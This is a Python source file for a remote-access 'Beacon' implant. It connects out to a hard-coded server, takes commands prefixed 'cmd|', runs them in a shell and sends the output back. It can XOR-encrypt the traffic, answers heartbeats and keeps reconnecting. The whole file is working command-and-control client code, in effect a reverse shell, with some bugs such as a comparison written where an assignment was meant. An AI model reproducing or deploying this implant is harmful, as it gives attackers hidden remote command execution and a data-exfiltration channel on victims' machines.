#!/usr/bin/python3

import socket,subprocess,time
from Crypto.Util.strxor import strxor

class Beacon:
   #Contains client side behavior and state

   __slots__ = ["sock","running","server_ip","server_port","debugging","key","encryption"]

   def __init__(self,server_ip,server_port):
      self.running = False
      self.server_ip = server_ip
      self.server_port = server_port
      self.debugging = True
      self.key = "chandifortnite"

   def connect(self):
      try:
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.connect((self.server_ip,self.server_port))
         message = self.sock.recv(15).decode()
         if message == "encryption on":
            self.encryption = True
         elif message == "encryption off":
            self.encryption == False
         else:
            raise RuntimeError("Unexpected Network Message Received")
      except:
         self.sock.close()

   def run_command(self,command):
      ps = None
      try:
         cmd = command.split(" ")
         try:
            ps = subprocess.run(cmd, shell=True, capture_output=True,check=True)
            if ps.returncode != 0:
               raise subprocess.CalledProcessError(ps.returncode,ps.args,ps.stdout)
         except subprocess.CalledProcessError as e:
            if self.debugging == True:
               print("Error:",e)
            if self.encryption == True:
               self.sock.send(self.encrypt(e.output))
               self.sock.send(self.encrypt("END".encode()))
            else:
               self.sock.send(e.output)
               self.sock.send("END".encode())
            return 1 #Exit the function
         if self.debugging == True:
            print("Sending:" ,ps.stdout)
         if ps.stdout != None and ps.stdout != b'':
            if len(ps.stdout) > 65535:
               for i in range(0, len(ps.stdout), 65535):
                 chunk = ps.stdout[i:i+65535]
                 if self.encryption == True:
                  self.sock.send(self.encrypt(chunk))
                  self.sock.send(self.encrypt("END".encode()))
                 else:
                  self.sock.send(chunk)
                  self.sock.send("END".encode())
            else:
               if self.encryption == True:
                 self.sock.send(self.encrypt(ps.stdout))
                 self.sock.send(self.encrypt("END".encode()))
               else:
                 self.sock.send(ps.stdout)
                 self.sock.send("END".encode())
         else:
            if self.encryption == True:
               self.sock.send(self.encrypt("SUCCESS".encode()))
               self.sock.send(self.encrypt("END".encode()))
            else:
               self.sock.send("SUCCESS".encode())
               self.sock.send("END".encode())
      except Exception as e:
                     error_msg = f"ERROR: {str(e)}"
                     if self.debugging == True:
                        print(error_msg)
                     if self.encryption == True:
                        self.sock.send(self.encrypt(error_msg.encode()))
                     else:
                        self.sock.send(error_msg.encode())

   def start(self):
      self.running = True
      while self.running:
            self.connect()
            if self.sock:
                self.run()
            else:
                time.sleep(10)
   
   def run(self):
      try:
         while self.running:
               self.sock.settimeout(5)
               try:
                  if self.encryption == True:
                     data = self.decrypt(self.sock.recv(4096)).decode()
                     if not data:
                        # If no data is received, break the loop
                        break
                     if self.debugging == True:
                        print("Received:",data)
                     split = data.split("|")
                     if split[0] == "cmd":
                        self.run_command(split[1])
                     elif split[0] == "quit":
                        self.terminate()
                     elif split[0] == "heartbeat":
                        self.sock.send(self.encrypt("ACTIVE".encode()))
                     else:
                        self.sock.send(self.encrypt("Unknown Error".encode()))
                  else:
                     data = self.sock.recv(4096).decode()
                     if not data:
                        # If no data is received, break the loop
                        break
                     if self.debugging == True:
                        print("Received:",data)
                     split = data.split("|")
                     if split[0] == "cmd":
                        self.run_command(split[1])
                     elif split[0] == "quit":
                        self.terminate()
                     elif split[0] == "heartbeat":
                        self.sock.send("ACTIVE".encode())
                     else:
                        self.sock.send("Unknown Error".encode())
               except socket.timeout:
                  continue
      except:
         self.start()
            
   def terminate(self):
      self.running = False
      if self.sock:
         self.sock.shutdown(socket.SHUT_RDWR)
         self.sock.close()
   
   def encrypt(self,data):
      key = self.key * (len(data) // len(self.key)) + self.key[:len(data) % len(self.key)]
      return strxor(data,key.encode())

   def decrypt(self,data):
      key = self.key * (len(data) // len(self.key)) + self.key[:len(data) % len(self.key)]
      return strxor(data,key.encode())

def main():
   beacon = Beacon("G15",10267)
   beacon.start()

if __name__ == "__main__":
   main()
